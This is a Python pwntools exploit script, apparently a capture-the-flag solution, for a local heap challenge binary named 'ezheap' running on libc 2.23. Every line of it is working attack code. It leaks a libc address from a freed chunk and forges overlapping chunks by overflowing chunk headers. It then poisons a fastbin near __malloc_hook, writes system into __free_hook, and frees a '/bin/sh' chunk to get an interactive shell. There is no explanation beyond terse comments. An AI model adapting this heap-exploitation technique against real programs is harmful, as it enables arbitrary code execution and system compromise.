#coding=utf-8
from pwn import*
context(os='linux',arch='amd64')
context.log_level = 'debug'
#gdb.attach(p)
#pause()

p = process('./ezheap')
libc = ELF('./libc-2.23.so')
elf = ELF('./ezheap')

def pr(a,addr):
	log.success(a+': '+hex(addr))

def add(size):
	p.sendlineafter("4.show\n",b"1")
	p.sendlineafter("how big\n",str(size))

def edit(idx,size,content):
	p.sendlineafter("4.show\n",b"3")
	p.sendlineafter("idx\n",str(idx))
	p.sendlineafter("how big u read\n",str(size))
	p.sendlineafter("Content:\n",content)

def delete(idx):
	p.sendlineafter("4.show\n",b"2")
	p.sendlineafter("idx\n",str(idx))

def show(idx):
	p.sendlineafter("4.show\n",b"4")
	p.sendlineafter("idx\n",str(idx))


add(0x100)#num 0
add(0x100)#1
add(0x100)#2

delete(1)#1
add(0x60)#2
show(2)

p.recvuntil("Content:")
main_are = u64(p.recv(6).ljust(8,b'\x00'))
libcbase = main_are - 0x3C3C78
system = libcbase + libc.sym['system']
__free_hook = libcbase + libc.sym['__free_hook']
__malloc_hook = libcbase + libc.sym['__malloc_hook']

pr('main_are',main_are)
pr('libcbase',libcbase)
pr('__free_hook',__free_hook)
pr('__malloc_hook',__malloc_hook)
pr('system',system)


add(0x90)#3
add(0x10)#4
delete(0)#3
edit(2, 0x70, 'A'*0x60 + p64(0x180) + p64(0xa0))
delete(3)#2

add(0x100)#3
add(0x60)#4
delete(4)#3

malloc_hook = __malloc_hook - 0x23 + 0x18
edit(2, 0x8, p64(malloc_hook))

add(0x90)#4

add(0x60)#5
edit(5, 0x10, '/bin/sh')

add(0x60)#6
edit(6, 0x60, '\x00'*0x1b + p64(0) + p64(0x70)*3 + p64(malloc_hook+0x2b))

add(0x60)#7
edit(7, 0x60, '\x00'*0x38 + p64(__free_hook-0xb58))


add(0x200)#8
add(0x200)#9
add(0x200)#10
add(0x200)#11
add(0x2d8)#12
add(0x100)#13
edit(13, 0x30, '\x00'*0x28 + p64(system))
#gdb.attach(p)
#pause()
delete(5)

p.interactive()